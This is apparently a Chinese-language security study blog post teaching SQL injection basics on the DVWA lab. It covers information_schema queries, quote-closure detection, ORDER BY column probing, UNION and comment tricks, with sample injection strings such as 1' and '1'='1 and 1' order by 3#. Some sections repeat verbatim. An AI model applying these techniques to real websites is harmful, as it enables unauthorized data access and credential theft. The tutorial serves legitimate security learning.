<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 | Only0901'blog</title><meta name="author" content="Only0901"><meta name="copyright" content="Only0901"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL 注入基础与联合查询注入**数据库基础知识 **数据库概况数据库：为了存储有复杂关联的数据而设计的一种应用 用途：存储数据的仓库 如果是少数的文件，可以直接使用文件进行存储 数据库类型：主流：关系型数据库：由多个数据表组成，表与表之间具有关联性 关系型数据库管理系统：MySQL、MSSQL 查询语言：SQL：结构化查询语言（Structured Query Language）：用来管理和操作">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://only-only1.github.io/2025/12/06/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Only0901&#39;blog">
<meta property="og:description" content="SQL 注入基础与联合查询注入**数据库基础知识 **数据库概况数据库：为了存储有复杂关联的数据而设计的一种应用 用途：存储数据的仓库 如果是少数的文件，可以直接使用文件进行存储 数据库类型：主流：关系型数据库：由多个数据表组成，表与表之间具有关联性 关系型数据库管理系统：MySQL、MSSQL 查询语言：SQL：结构化查询语言（Structured Query Language）：用来管理和操作">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://only-only1.github.io/images/QQ20251206-195428.png">
<meta property="article:published_time" content="2025-12-06T11:31:31.000Z">
<meta property="article:modified_time" content="2025-12-06T11:54:46.150Z">
<meta property="article:author" content="Only0901">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://only-only1.github.io/images/QQ20251206-195428.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQL注入",
  "url": "https://only-only1.github.io/2025/12/06/SQL%E6%B3%A8%E5%85%A5/",
  "image": "https://only-only1.github.io/images/QQ20251206-195428.png",
  "datePublished": "2025-12-06T11:31:31.000Z",
  "dateModified": "2025-12-06T11:54:46.150Z",
  "author": [
    {
      "@type": "Person",
      "name": "Only0901",
      "url": "https://only-only1.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://only-only1.github.io/2025/12/06/SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fa-solid fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/QQ20251206-195428.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Only0901'blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fa-solid fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-06T11:31:31.000Z" title="发表于 2025-12-06 19:31:31">2025-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-06T11:54:46.150Z" title="更新于 2025-12-06 19:54:46">2025-12-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQL-注入基础与联合查询注入"><a href="#SQL-注入基础与联合查询注入" class="headerlink" title="SQL 注入基础与联合查询注入"></a><strong>SQL 注入基础与联合查询注入</strong></h1><h2 id="数据库基础知识"><a href="#数据库基础知识" class="headerlink" title="**数据库基础知识 **"></a>**数据库基础知识 **</h2><h4 id="数据库概况"><a href="#数据库概况" class="headerlink" title="数据库概况"></a><strong>数据库概况</strong></h4><p>数据库：为了存储有复杂关联的数据而设计的一种应用</p>
<p>用途：存储数据的仓库</p>
<p>如果是少数的文件，可以直接使用文件进行存储</p>
<p>数据库类型：主流：关系型数据库：由多个数据表组成，表与表之间具有关联性</p>
<p>关系型数据库管理系统：MySQL、MSSQL</p>
<p>查询语言：SQL：结构化查询语言（Structured Query Language）：用来管理和操作关系型数据库的标准化编程语言。</p>
<p>SQL 功能：数据库查询、数据的插入、更新、删除、以及数据库结构的创建和修改等</p>
<h4 id="Mysql-的元数据仓库"><a href="#Mysql-的元数据仓库" class="headerlink" title="Mysql 的元数据仓库"></a><strong>Mysql 的元数据仓库</strong></h4><p>**information_schema （数据库） **</p>
<p>是Mysql5.0 以上才有一个特性</p>
<p>是Mysql，MariaDB 等数据库的元数据仓库，保存了 Mysql 数据库管理系统里面所有数据库实例的信息，</p>
<p>比如数据库名，数据库的表名，表的类型，访问权限等。简单：在这台Mysql 服务器上有哪些数据库，</p>
<p>各个数据库又有哪些表。每张表的字段（列）又有哪些</p>
<p>重要的表：</p>
<p>**shemata **：该表保存了当前mysql 实例中所有的数据库的信息。 show databases;（select schema_name from information_schema.schemata;） 的结果就是取自该表</p>
<p>列（字段）：shema_name: 存储的数据库名</p>
<p><strong>tables</strong>：保存了数据库中的表的信息：某个表属于哪个schema，表类型。创建的时间。</p>
<ul>
<li>列 （字段）：table_schema: 该表所属数据库的名字</li>
</ul>
<p>table_name ：表名</p>
<p>**columns **：该表中提供了表的列（字段）信息，详细描述了某张表的所有列以及每个列的信息。</p>
<p>table_schema: 列（字段）所属的数据库的名字</p>
<p>table_name ：列（字段）所属表的名字</p>
<p>column_name :列（字段）的名字</p>
<p>schema :在 mysql 中，就是数据库的代名词</p>
<p>&#x2F;&#x2F;select 字段名(列名) from 数据库名.表名</p>
<p>select schema_name from information_schema.schemata; &#x2F;&#x2F;获取所有当前 mysql 实例中数据库 的名字</p>
<p>– 获取所有数据库的所有表名：</p>
<p>select table_name from information_schema.tables;</p>
<p>– 获取某个数据库中的所有表名：</p>
<p>select table_name from information_schema.tables where table_schema&#x3D;’dvwa’;</p>
<p>select table_name from information_schema.tables where table_schema&#x3D;database();</p>
<p>&#x2F;&#x2F;table_schema 后跟的所属数据库的名字，一定要用单引号或者双引号包裹起来。</p>
<p>– 获取所有数据库的所有表的所有列名</p>
<p>select column_name from information_schema.columns;</p>
<p>–获取某个数据库的某个表的所有列名</p>
<p>select column_name from</p>
<p>information_schema.columns where table_schema&#x3D;’dvwa’ and table_name&#x3D;’users’;</p>
<p>常见的mysql 信息查询的语句：</p>
<p>当前用户：user()</p>
<p>数据库版本：version()</p>
<p>当前数据库名：database()</p>
<p>操作系统：@@version_compile_os</p>
<h4 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a><strong>ORDER BY 语句</strong></h4><p>order by ： 排序子语句</p>
<p>SELECT * FROM products ORDER BY 1;</p>
<p>SQL 注入中的核心用途：用来探测查询的列数：修改后面的列索引，判断原查询的列数</p>
<p>当输入的数字超出了原查询的列数，会报错</p>
<p>SELECT * FROM products ORDER BY 数字（表示第几列）;</p>
<p>判断依据：</p>
<p>页面正常–列数 &gt;&#x3D;指定的数据</p>
<p>页面异常–列数 &lt; 指定的数据</p>
<h4 id="UNION-操作"><a href="#UNION-操作" class="headerlink" title="UNION 操作"></a><strong>UNION 操作</strong></h4><p>正常：合并两个SELECT 查询的结果</p>
<p>限定条件：每个SELECT 语句必须具有相同的列数，默认会去重</p>
<p><img src="/images/image.png" alt="image.png"></p>
<h4 id="GROUP-CONCAT-函数"><a href="#GROUP-CONCAT-函数" class="headerlink" title="GROUP_CONCAT()函数"></a><strong>GROUP_CONCAT()函数</strong></h4><p>聚合函数：将多行数据合并为字符串的形式返回</p>
<p>默认是1024 字节，默认使用英文逗号( , )分割，自定义分割符 SEPARATOR ‘;’</p>
<p>Mysql 注释符</p>
<h1 id="在浏览器里面有特殊含义（页面锚点），在-GET-请求中不会被发送到后端，如果要让它发送到"><a href="#在浏览器里面有特殊含义（页面锚点），在-GET-请求中不会被发送到后端，如果要让它发送到" class="headerlink" title=":在浏览器里面有特殊含义（页面锚点），在 GET 请求中不会被发送到后端，如果要让它发送到"></a>:在浏览器里面有特殊含义（页面锚点），在 GET 请求中不会被发送到后端，如果要让它发送到</h1><p>后端，使用URL 编码 %23</p>
<p>– （ – 后面有空格符（空格，tab，换行符）：通常写成 –+ (因为 + 会被浏览器解释为空格) 也可以</p>
<p>用URL 编码 –%20 （有些浏览器或者应用会把 + 编码为 %2B ,因为不同的应用遵循的 RFC 规范不一样</p>
<p>&#x2F;**&#x2F; 多行注释，常用来替换空格</p>
<p><img src="/images/image_1765021103142.png" alt="image.png"></p>
<h4 id="SELECT-不出现-from-的用法"><a href="#SELECT-不出现-from-的用法" class="headerlink" title="**SELECT 不出现 from 的用法 **"></a>**SELECT 不出现 from 的用法 **</h4><p>mysql 里面允许 select 语句没有 from</p>
<p>作用：判断列回显的位置</p>
<p>用法：select 常量</p>
<p>结果：这语句并不指向任何表，返回的结果为一个一行 n 列的临时结果</p>
<p>说明：</p>
<p>此临时结果的列名为所指常量</p>
<p>n：指 select 后面有多少个常量</p>
<p>如 select 1，2，3 ，则查询的表如下 （注意：第一行是列名，第二行为值）</p>
<p>**-**1 **或者 **’</p>
<p>一般情况下：页面之后返回查询结果数据中的一行数据。当输入 1 ，则不能返回 select 常量 查询的数</p>
<p>据。要让第一个select 的结果（原查询语句的结果）为空集。才能返回后面的 select 常量 查询到的数</p>
<p>据。</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><strong>SQL</strong></h2><p>四种类型的语言：</p>
<p>数据定义语言：DDL：用于数据库对象的定义、创建和修改删除数据库、数据表和索引。</p>
<p>CREATE TABLE table_name();</p>
<p>数据操作语言（DML）：用来插入、更新和删除记录：</p>
<p>INSERT INTO</p>
<p>UPDATE</p>
<p>数据控制语言（DCL）：管理数据库的安全性，包括用户的权限控制：授予和撤销用户权限：</p>
<p>GRANT</p>
<p>数据查询语言（DQL）：用来获取数据的</p>
<p>SELECT</p>
<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a><strong>SQL 注入</strong></h2><p>正常情况：</p>
<p>1、<a target="_blank" rel="noopener" href="http://example.com/user.php?name=%E4%B8%BB%E6%92%AD%E5%B0%8F%E7%BE%8E">http://example.com/user.php?name=主播小美</a></p>
<p>后端数据SQL 查询可能是这样的：</p>
<p>2、从 users 表里面查询用户名为小美的用户信息</p>
<p>SELECT userinfo FROM users(数据表的名字) where name&#x3D;”小美”; &#x2F;&#x2F;正常查询。符合程序的预期</p>
<p>3、信息返回给 example.com 的 web 服务器</p>
<p>4、example.com 的 web 服务器把信息返回给客户端（用户）</p>
<p>非正常情况下：</p>
<p>1、<a target="_blank" rel="noopener" href="http://example.com/user.php?name=%E4%B8%BB%E6%92%AD%E5%B0%8F%E7%BE%8E">http://example.com/user.php?name=主播小美</a>“ and 1&#x3D;1</p>
<p>后端数据SQL 查询可能就变成这样的：（如果程序没有对用户输入做过滤）</p>
<p>2、从 users 表里面查询用户名为小美的用户信息</p>
<p>SELECT userinfo FROM users(数据表的名字) where name&#x3D;”主播小美” and 1&#x3D;1; &#x2F;&#x2F;非正常查询。</p>
<p>不符合程序的预期</p>
<p>3、此时查询的信息就不一定只有“小美”的信息了</p>
<p>当SQL 查询的内容不符合原本的预期：</p>
<p>异常错误信息</p>
<p>数据返回异常</p>
<p>服务器异常</p>
<p>SQL 注入产生的原因：程序没有对用户的输入进行过滤，直接拼接到 SQL 查询语句中。从而为恶意攻击</p>
<p>提供了机会。</p>
<p>SQL 注入类型：</p>
<p>通过HTTP 请求方式：GET 请求，POST 请求、Head</p>
<p><strong>结果反馈分类：有回显注入(显错注入)、无回显注入(盲注)</strong></p>
<p>数据类型：数字型（0-9 数字组成的比如：id&#x3D;1），字符型：通常使用单引号或者双引号括起来的查询值</p>
<p>（比如username&#x3D;’lee2dog’)</p>
<p>WHERE id &#x3D; -1 or 1&#x3D;1 :</p>
<p>由于1&#x3D;1 恒为真，OR 运算使得整个条件成立，从而返回所有值。</p>
<p>逻辑运算的优先级：NOT&gt;AND&gt;OR</p>
<p>字符型：有引号包裹：需要注意引号的配对（引号是成双成对出现，需要前后闭合）</p>
<p>DVWA：DVWA Security ：改成 Low</p>
<p>SQL 是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用</p>
<p>SQL。</p>
<p>SQL 注入漏洞是由于程序没有对用户输入数据的合法性进行验证和过滤，导致 SQL 查询语句被恶意拼</p>
<p>接从而产生SQL 注入漏洞。</p>
<p>原理：</p>
<p>由于Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在 Web 应用程序中事先</p>
<p>定义好的查询语句的结尾上添加额外的SQL 语句，在管理员不知情的情况下实现非法操作，以此来实</p>
<p>现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<p>危害：</p>
<p>SQL 注入是危害 WEB 安全的主要攻击手段，存在 SQL 注入的网站一但被攻击成功，产生的后果将有可</p>
<p>能是毁灭性及不可恢复的。比如：</p>
<ol>
<li>获取敏感数据：获取网站管理员帐号、密码等。</li>
<li>绕过登录验证：使用万能密码登录网站后台等。</li>
<li>文件系统操作：列目录，读取、写入文件等。</li>
<li>注册表操作：读取、写入、删除注册表等。</li>
<li>执行系统命令：远程执行命令。</li>
</ol>
<p>分类：</p>
<ol>
<li>根据注入位置分类：GET 注入、POST 注入、Head 头注入。</li>
<li>根据结果反馈分类：有回显注入(显错注入)、无回显注入(盲注)</li>
<li>根据数据类型分类：</li>
</ol>
<p>a. 字符型注入：当输入参数为字符串时，称为字符型。数字型与字符型注入昀大的区别在于：数字型</p>
<p>不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>
<p>b. 数字型注入：当输入的参数为整型时，如 ID、年龄、页码等，如果存在注入漏洞，则可以认为是数 字型注入。</p>
<p>还有一些根据数据库不同进行分类等。</p>
<h2 id="SQL-注入方法"><a href="#SQL-注入方法" class="headerlink" title="SQL 注入方法"></a><strong>SQL 注入方法</strong></h2><p>(1) 判断是否存在注入</p>
<p>利用’（单引号）或者”（双引号）来判断是否存在漏洞，如果出现 SQL 语句错误说明有很大的可能会存在漏洞。</p>
<p>假设后端的SQL 语句为：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘$id’</p>
<p>当浏览器输入1，后端获取到前端的输入后将其赋值给$id 这个变量，此时 SQL 查询语句为：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘1’</p>
<p>数据库从users 表中把满足 user_id&#x3D;1 这个条件的行（记录）中的 first_name、last_name 查询出 来，在前端浏览器里显示为：</p>
<p><img src="/images/image_1765021144794.png" alt="image.png"></p>
<p>当id 值为 1’的时候，后端 SQL 语句就变为了：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘1’’</p>
<p>可以看到多了一个单引号，因为单引号不匹配，则会报错。因为能引起数据库的报错，说明用户是可 以对原查询语句进行修改的，说明存在漏洞。</p>
<p><img src="/images/image_1765021179180.png" alt="image.png"></p>
<p>(2) 判断注入类型</p>
<p>判断注入类型是数字型还是字符型，这涉及到在注入的过程中是否需要添加单引号（数字型不需要引号，字符型需要引号），可以使用：1 and 1&#x3D;1、1 and 1&#x3D;2 和 1’ and ‘1’&#x3D;’1、1’ and ‘1’&#x3D;’2 进行判断。</p>
<p>判断注入类型</p>
<p>输入1 and 1&#x3D;1、1 and 1&#x3D;2</p>
<p><img src="/images/image_1765021225595.png" alt="image.png"></p>
<p><img src="/images/image_1765021256186.png" alt="image.png"></p>
<p>页面均显示正常，说明他就不是数值型</p>
<p>而输入1’ and ‘1’&#x3D;’1、1’ and ‘1’&#x3D;’2</p>
<p><img src="/images/image_1765021291838.png" alt="image.png"></p>
<p>正常显示</p>
<p><img src="/images/image_1765021313023.png" alt="image.png"></p>
<p>无回显，无回显就是false，就说明存在漏洞可以修改语句进行注入</p>
<p>判断吗闭合类型</p>
<p>输入1’ 报错回显 ‘’ 1’ ‘’ 说明是单引号闭合</p>
<p>输入1’ 报错回显 ‘ ‘’ 1’ ‘’ ‘说明是双引号闭合</p>
<p>（报错会自带一个’‘）</p>
<p>MySQL 对字符串到数值的转换会截取开头数字部分</p>
<p>‘1abc’→1，’abc’→0</p>
<p>因此’1 and 1&#x3D;1’→1</p>
<p>因此’1 and 1&#x3D;1’被作为整体字符串处理，不会触发注入</p>
<p>如果是字符型则需要使得单引号（**’**）进行闭合，因为 <strong>MySQL</strong> 中的引号都是成双成对出现的。</p>
<p>为什么从以上方法中可以判断出注入的类型呢？</p>
<p>a. 当用户输入1 and 1&#x3D;1时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1 and 1&#x3D;1’，实际上昀</p>
<p>终查询的还是’1’。</p>
<p>b. 当用户输入1 and 1&#x3D;2时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1 and 1&#x3D;2’，实际上昀 终查询的还是’1’。</p>
<p>c. 当用户输入1’ and ‘1’&#x3D;’1时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1’ and ‘1’&#x3D;’1’，实际上昀终查询的是user_id &#x3D;’1’并且’1’&#x3D;’1’。</p>
<p>d. 当用户输入1’ and ‘1’&#x3D;’2时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1’ and ‘1’&#x3D;’2’，实际</p>
<p>上昀终查询的是user_id &#x3D;’1’并且’1’&#x3D;’2’。因为1&#x3D;2不成立，所以整条语句也都不成立，因</p>
<p>此可以知道页面返回为空是由于sql 语句不成立导致的。</p>
<p>在mysql 中，and 是一个逻辑运算符意思为“并且”，用于在 WHERE 子语句中把两个或多个条件结合起来；当使用 and 关键字时，会返回符合所有条件的记录，如果有任何一个条件不符合，这样的记录将被排除掉。也就是当 and 两边都为真才是真，有一边为假则是假；or 是一个逻辑运算符，用于组合两个或多个条件，当其中至少有一个条件为真时，整个表达式的结果为真。</p>
<h2 id="SQL-注入的一些常见位置"><a href="#SQL-注入的一些常见位置" class="headerlink" title="SQL 注入的一些常见位置"></a><strong>SQL 注入的一些常见位置</strong></h2><p>SQL 注入的一些常见位置：</p>
<p>1、URL 参数部分：?id&#x3D;1</p>
<p>2、表单输入：比如用户名、密码、搜索框</p>
<p>3、Cookie: 用来存储用户信息和会话状态</p>
<p>4、HTTP 头部其他字段：有些应用需要从 HTTP 头部中获取数据信息</p>
<p>总：凡是与数据库查询相关的地方，都有可能存在SQL 注入</p>
<h2 id="SQL-注入的步骤"><a href="#SQL-注入的步骤" class="headerlink" title="SQL 注入的步骤"></a><strong>SQL 注入的步骤</strong></h2><p>SQL 注入的步骤：</p>
<h4 id="1、判断注入点：通过插入非预期数据，让页面报错（报错信息，也有页面异常）"><a href="#1、判断注入点：通过插入非预期数据，让页面报错（报错信息，也有页面异常）" class="headerlink" title="**1、判断注入点：通过插入非预期数据，让页面报错（报错信息，也有页面异常） **"></a>**1、判断注入点：通过插入非预期数据，让页面报错（报错信息，也有页面异常） **</h4><p>利用’（单引号）或者”（双引号）来判断是否存在漏洞，如果出现 SQL 语句错误说明有很大的可能会存在漏洞。</p>
<p>假设后端的SQL 语句为：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘$id’</p>
<p>当浏览器输入1，后端获取到前端的输入后将其赋值给$id 这个变量，此时 SQL 查询语句为：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘1’</p>
<p>数据库从users 表中把满足 user_id&#x3D;1 这个条件的行（记录）中的 first_name、last_name 查询出 来，在前端浏览器里显示为：</p>
<p><img src="/images/image_1765021349758.png" alt="image.png"></p>
<p>当id 值为 1’的时候，后端 SQL 语句就变为了：</p>
<p><strong>SELECT</strong> first_name, last_name <strong>FROM</strong> users <strong>WHERE</strong> user_id &#x3D; ‘1’’</p>
<p>可以看到多了一个单引号，因为单引号不匹配，则会报错。因为能引起数据库的报错，说明用户是可 以对原查询语句进行修改的，说明存在漏洞。</p>
<p><img src="/images/image_1765021385626.png" alt="image.png"></p>
<h4 id="2、判断闭合方式（单引号，双引号，或者单引号-括号，双引号-括号）"><a href="#2、判断闭合方式（单引号，双引号，或者单引号-括号，双引号-括号）" class="headerlink" title="**2、判断闭合方式（单引号，双引号，或者单引号 + 括号，双引号 + 括号） **"></a>**2、判断闭合方式（单引号，双引号，或者单引号 + 括号，双引号 + 括号） **</h4><p><img src="/images/image_1765021423025.png" alt="image.png"></p>
<p>页面均显示正常，说明他就不是数值型</p>
<p>而输入1’ and ‘1’&#x3D;’1、1’ and ‘1’&#x3D;’2</p>
<p><img src="/images/image_1765021475439.png" alt="image.png"></p>
<p>正常显示</p>
<p><img src="/images/image_1765021516280.png" alt="image.png"></p>
<p>无回显，无回显就是false，就说明存在漏洞可以修改语句进行注入</p>
<p>判断吗闭合类型</p>
<p>输入1’ 报错回显 ‘’ 1’ ‘’ 说明是单引号闭合</p>
<p>输入1’ 报错回显 ‘ ‘’ 1’ ‘’ ‘说明是双引号闭合</p>
<p>（报错会自带一个’‘）</p>
<p>MySQL 对字符串到数值的转换会截取开头数字部分</p>
<p>‘1abc’→1，’abc’→0</p>
<p>因此’1 and 1&#x3D;1’→1</p>
<p>因此’1 and 1&#x3D;1’被作为整体字符串处理，不会触发注入</p>
<p>如果是字符型则需要使得单引号（**’**）进行闭合，因为 <strong>MySQL</strong> 中的引号都是成双成对出现的。</p>
<p>为什么从以上方法中可以判断出注入的类型呢？</p>
<p>a. 当用户输入1 and 1&#x3D;1时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1 and 1&#x3D;1’，实际上昀</p>
<p>终查询的还是’1’。</p>
<p>b. 当用户输入1 and 1&#x3D;2时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1 and 1&#x3D;2’，实际上昀 终查询的还是’1’。</p>
<p>c. 当用户输入1’ and ‘1’&#x3D;’1时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1’ and ‘1’&#x3D;’1’，实际上昀终查询的是user_id &#x3D;’1’并且’1’&#x3D;’1’。</p>
<p>d. 当用户输入1’ and ‘1’&#x3D;’2时，SQL 语句变成了：</p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D;’1’ and ‘1’&#x3D;’2’，实际</p>
<p>上昀终查询的是user_id &#x3D;’1’并且’1’&#x3D;’2’。因为1&#x3D;2不成立，所以整条语句也都不成立，因</p>
<p>此可以知道页面返回为空是由于sql 语句不成立导致的。</p>
<p>在mysql 中，and 是一个逻辑运算符意思为“并且”，用于在 WHERE 子语句中把两个或多个条件结合起来；当使用 and 关键字时，会返回符合所有条件的记录，如果有任何一个条件不符合，这样的记录将被排除掉。也就是当 and 两边都为真才是真，有一边为假则是假；or 是一个逻辑运算符，用于组合两个或多个条件，当其中至少有一个条件为真时，整个表达式的结果为真。</p>
<h4 id="3、判断可以查询的字段个数（列数）"><a href="#3、判断可以查询的字段个数（列数）" class="headerlink" title="**3、判断可以查询的字段个数（列数） **"></a>**3、判断可以查询的字段个数（列数） **</h4><p>order by ： 排序子语句</p>
<p>SELECT * FROM products ORDER BY 1;</p>
<p>SQL 注入中的核心用途：用来探测查询的列数：修改后面的列索引，判断原查询的列数</p>
<p>当输入的数字超出了原查询的列数，会报错</p>
<p>SELECT * FROM products ORDER BY 数字（表示第几列）;</p>
<p>判断依据：</p>
<p>页面正常–列数 &gt;&#x3D;指定的数据</p>
<p>页面异常–列数 &lt; 指定的数据</p>
<p>1’ <strong>order</strong> <strong>by</strong> 3#’</p>
<p><img src="/images/image_1765021565571.png" alt="image.png"></p>
